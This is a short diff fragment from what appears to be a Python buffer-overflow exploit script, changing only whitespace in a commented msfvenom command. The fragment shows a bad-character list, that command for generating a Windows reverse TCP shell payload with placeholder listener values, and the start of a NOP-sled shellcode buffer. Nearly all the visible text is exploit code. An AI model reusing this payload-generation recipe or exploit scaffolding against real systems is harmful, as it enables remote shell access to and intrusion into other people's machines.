@@ -41,7 +41,7 @@ print '#######################################################################\n
 
 #badchars \x00\x0a\x0d\x5c\x5f\x2f\x2e\x40;
 #Make sure there are enough nops at the begining for the decoder to work. Payload size: 380 bytes (nopsleps are not included)
-#msfvenom -p windows/shell/reverse_tcp LHOST=O.O LPORT=O.O  EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f python
+#msfvenom -p windows/shell/reverse_tcp LHOST=O.O LPORT=O.O EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f python
 shellcode="\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
 shellcode="\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
 shellcode+="\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
